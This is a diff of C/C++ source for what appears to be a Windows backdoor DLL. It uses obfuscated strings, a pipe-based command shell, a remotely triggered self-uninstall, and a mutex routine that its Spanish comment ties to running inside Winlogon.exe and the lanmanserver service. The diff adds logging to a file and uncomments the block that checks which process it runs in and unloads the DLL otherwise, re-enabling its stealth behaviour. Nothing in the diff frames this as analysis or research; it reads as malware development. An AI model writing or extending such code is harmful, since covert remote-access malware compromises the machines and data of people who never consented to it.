@@ -24,13 +24,13 @@
 #include <Tlhelp32.h>
 #include <Winnetwk.h>
 
-//#define DEBUG_SHOW_ERROR 
-#define COMPILE_WITH_HANDLE_EXCEPTION 
+//#define DEBUG_SHOW_ERROR
+#define DEBUG_SHOW_ERROR_TO_FILE
+#define COMPILE_WITH_HANDLE_EXCEPTION
 #define CHECK_ADMIN_INTERACTIVE_LOGON 
 
 #include "shellpipe.h"
 #include "encode_string.h"
-//#include "util.h"
 #include "util.cpp"
 #include "package.cpp"
 #include "bridged.cpp"
@@ -410,9 +410,11 @@ DWORD ProccesMacro(HANDLE hPipe, LPSTR cmdLine){
 	if(strstr(selectMacro, ds.getDecodeString((LPSTR)encStr_uninstall))){
 		WriteToPipe(hPipe, ds.length(), ds.getDecodeString((LPSTR)encStr_Uninstalling), NULL);
 
-		if (dwLenArrayCmdLine >= 2)
-			if(strstr(lpArrayCmdLine[1], "true"))
+		if (dwLenArrayCmdLine >= 2){
+			if(strstr(lpArrayCmdLine[1], "true")){
 				ACTIVE_UNISTALL_PROC_BY_DEMAND_REMOTE = TRUE;
+			}
+		}
 
 		ACTIVE_UNISTALL_PROC_BY_DEMAND = TRUE;
 		return TRUE;
@@ -593,7 +595,7 @@ DWORD CheckMutex(LPVOID lpParam){
 	}
 
 	//Chequeo para iniciar en Winlogon.exe y servicio lanmanserver
-	/*if(!GetModuleFileNameEx(GetCurrentProcess(), NULL, (LPSTR)lpszProc, MAX_PATH)){
+	if(!GetModuleFileNameEx(GetCurrentProcess(), NULL, (LPSTR)lpszProc, MAX_PATH)){
 		if(WaitAndCheckUnloadMutex(45, 1000))
 			UnloadDLL();
 	}
@@ -608,7 +610,7 @@ DWORD CheckMutex(LPVOID lpParam){
 		if(WaitAndCheckUnloadMutex(1, 1000))
 			UnloadDLL();
 		if((++dwTimeCounter) >= 40) break;
-	}*/
+	}
 
 	secAttr.bInheritHandle = FALSE;
 	secAttr.lpSecurityDescriptor = GetSecDescriptorFromStringSecDesc(MUTEX_STRING_SECURITY_DESCRIPTOR);
